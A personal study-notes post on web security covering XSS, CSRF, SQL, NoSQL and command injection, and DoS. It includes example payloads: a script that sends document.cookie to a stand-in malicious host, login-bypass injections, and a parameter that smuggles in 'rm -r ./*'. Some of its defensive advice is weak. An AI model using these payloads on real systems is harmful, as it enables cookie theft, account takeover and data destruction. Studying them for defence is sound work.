When I was in an interview of Tencent, the interviewer asked me how much Web security points you know?

I found I don't have a systemic knowledge network about it.

So, there are some points I collected for memory.

## XSS

Its full name is Cross Site Script. But its abbreviation is CSS, which is the same as Cascading 
Style Sheets. SO....it becomes XSS. 

XSS is a code injection attack that allows an attacker to execute malicious 
JavaScript in another user's browser.

It includes these 3 types:

### Persistent XSS

Normally happened in those websites users can post their input. The malicious code will be saved in 
the database, therefore, each user who opened the page will be attacked.

For example, if there is a input tag, user can post their own content by it. Other users can open this page see 
the content.

```html
<!--the content in this tag will be post to database-->
<input type="text"> 

<!--if a user input "Users content", other user can see as below-->
<p>Users content</p>
```

But, if someone input a string as below:
`<script src="http://www.malicious-site.com/code"></script>`

the final result may as:

```html
<p><script src="http://www.malicious-site.com/code"></script></p>
```

And the script like as below:

```js
var img = document.createElement('img');
img.src = 'http://www.malicious-site.com/save-cookie?cookie=' + document.cookie;
document.body.appendChild(img);
```

In this way, the malicious site can get the cookie of each user who open the page.

To prevent it, I think the best way is to filter users' post content.

### Reflected XSS

Its principle is the same as Persistent XSS, attacker try to get user's personal information 
by insert HTML tag.

For example, there is a error page who shows error messages from the server by url, like 
`http://www.some-page.com/error?message=Page%20not%20found`, the content in `message` will be showed in 
HTML, like:

```html
<p>Page not found</p>
```

If an attack inputs an URL like `http://www.some-page.com/error?message=<script src="http://www.malicious-site.com/code"></script>`,
The final HTML will become:

```html
<p><script src="http://www.malicious-site.com/code"></script></p>
```

Next processes will be the same as Persistent XSS.

### DOM-based XSS

According to some of articles on the Internet, Dom-based XSS is a special Reflected XSS.

In my understanding, DOM-based XSS triggers attack via modifying DOM content, such as 
`innerHTML`, which is the same as Reflected XSS. 

But, their difference is that Dom-based XSS won't leave a mark in the server side, compared to Reflected XSS
which will leave a url record in the server request log.

There is a simple example updated from last example of Reflected XSS:

we can use a new url like:`http://www.some-page.com/error?message=Page%20not%20found#%3Cscript%20src%3D%22http%3A%2F%2Fwww.malicious-site.com%2Fcode%22%3E%3C%2Fscript%3E`.

The biggest difference is that we can use `location.hash` to inject malicious code to the page, which won't show the url after `#` in the 
server side. In this way, it is more difficult for website maintainers to find the attack by checking request log.

So the biggest difference among Reflected XSS and DOM-based XSS is that DOM-based XSS cannot be found in the server side, it is 
pure attack happened on client side.

### How to prevent XSS

I think the best way to prevent XSS is to forbid users to change HTML content, but this is difficult especially for those websites 
based on UGC. 

So, the feasible way is to filter url's parameters and UGC, such as some of special chars, `<>\/*;'`.

There are some alternative chars to replace sensitive chars in JS, such as `\u003c` and `\x3c` to replace `<`, and `\u003e` and `\x3e` to 
replace `>`.

## CSRF

Its full name is Cross Site Request Forgery, abbreviation is CSRF. 

Like XSS, it may steal users' cookie.

But their difference is that XSS is to make use of the trust for users, CSRF is to pretend as the user.

For example, there is a request `http://www.money.com?account=sender&amount=10000&for=receiver` to transfer money while 
the user was already logined and cookie was saved. If the user go to a malicious website which add a tag like 
`<img src='http://www.money.com?account=sender&amount=10000&for=hacker'>`, the cookie will be with this request because of
same domain.

In this way, the hacker does not need to get the user's cookie when attacking.

There are some ways to protect:

### Check HTTP Referer

The most simple way is to check HTTP Referer, which can identify the original website of 
the request. 

In Node.JS, for example:

```js
app.use(req => {
    if (req.headers.referer === 'http://legal-site.com'){
        //do something
    } else {
        //reject request
    }
});
```

But, in some of old version chrome, such as IE6 or FF2, there are ways to artificially modify 
HTTP Referer. Besides, users may forbid browser to offer HTTP Referer.

### Token

CSRF is to forge normal real user request. So, if we can use create a token that the attacker cannot 
get, we can avoid CSRF.

For example, we can calculate post message's hash value in front side, and set it in the url or http header,
when server is processing the request, it can check the token, if the token is not right, refuse to response.

## Injection Attack

Injection attacks refer to a broad class of attack vectors. In an injection attack, an attacker supplies untrusted 
input to a program. This input gets processed by an interpreter as part of a command or query. In turn, this alters 
the execution of that program.

It includes some of typical types as below:

### SQL Injection

SQL Injection may execute malicious SQL statements in the database, such as getting whole data of the table or specific 
user information. 

#### Number Injection

For example, if there is a API to GET user's information: `www.example.com?id=1`, the SQL statement is `SELECT * FROM users WHERE id=$id`.
if we input `www.example.com?id=1 OR 1=1`, the statement will become `SELECT * FROM Users WHERE id=1 OR 1=1`. As a result, 
attacker can get whole table information. 

#### String Injection

Or, if there is a API for POST to login, the parameters include username and password. The SQL statement may like 
`SELECT * FROM users WHERE username='user' AND password='password'`.

Attacker may try to make the part of statement after username become comments to directly get users' information without password.

For example, if the user input is `user' # `, the final statement will become `SELECT * FROM users WHERE username='user' # ' AND password='password'`, which is
the same as `SELECT * FROM users WHERE username='user'`.

Similarly, input user as `user' -- ` also work as `SELECT * FROM users WHERE username='user' -- ' AND password='password'`, which is
the same as `SELECT * FROM users WHERE username='user'`.

### NoSQL Injection

Like SQL, NoSQL database like MongoDB can also be injected.

Like the same example in SQL Injection, if the application uses NoSQL database such as Mongodb, 
the statement may be `db.users.find({username:user, password=password})`.

If someone's JSON input object likes:

```
{
  "username": "user",
  "password": {$gt: ""}
}
```

In MongoDB, $gtselects those documents where the value of the field is greater than (i.e. >) the specified value. 
Thus above statement compares password in database with empty string for greatness, which returns true.

The same results can be achieved using other comparison operator such as $ne.

### Command Injection

Like SQL Injection and NoSQL Injection, Command Injection will also run malicious code because of a user's input. 

For example, if there is an API allows users to compress specific file in the server:

```js
app.use.get('/gzip', (req, res)=>{
    child_process.exec(`exec ${req.query.file_path}`, (err, data)=>{
        if (err){
            res.send(err.toString());
        } else {
            res.send(data.toString());
        }
    })
});
```

If some one input an URL like: `www.example.com/gzip?file_path=file.txt\rm -r ./*`, it may be a disaster.

### How to prevent 

There are some tips:

1. use prepared statements instead of building dynamic queries using string concatenation.

2. Validate inputs to detect malicious values.

3. To minimize the potential damage of a successful injection attack, do not assign DBA or admin type access rights 
to your application accounts. Similarly minimize the privileges of the operating system account that the database process runs under.

## DoS Attack

In computing, a denial-of-service attack (DoS attack) is a cyber-attack in which the perpetrator seeks to make a machine 
or network resource unavailable to its intended users by temporarily or indefinitely disrupting services of a host connected to the Internet.

includes:

1. SYN Flood

2. ICMP Flood

3. UDP Flood

Compared to DoS attack, A distributed denial-of-service (DDoS) attack occurs when multiple systems flood the bandwidth 
or resources of a targeted system, usually one or more web servers. Such an attack is often the result of multiple 
compromised systems (for example, a botnet) flooding the targeted system with traffic.